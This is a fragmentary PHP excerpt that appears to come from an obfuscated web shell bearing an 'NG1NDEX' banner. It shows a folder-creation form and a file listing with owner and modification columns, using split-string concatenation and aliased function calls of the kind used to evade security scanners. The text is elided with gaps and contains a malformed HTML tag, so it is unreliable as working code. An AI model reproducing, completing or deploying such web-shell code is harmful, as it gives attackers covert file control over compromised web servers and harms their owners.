...
echo '<font face="Bungee" size="5">NG1NDEX</font></center>
    ...
    if ($isw("./") || $ird("./")) {
        ...
        if (isset($_POST['buatfolder'])) {
            ...
            if ($buatf == true) {
                ...
                echo '<form method="post"><center>Folder : <inputtype="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
...
<td><center>Las'.'t Mo'.'dif'.'ied</center></td><td><center>Owner / Group</center></td>
...
$skd = "10"."24";foreach($lokasinya as $mekicina) {
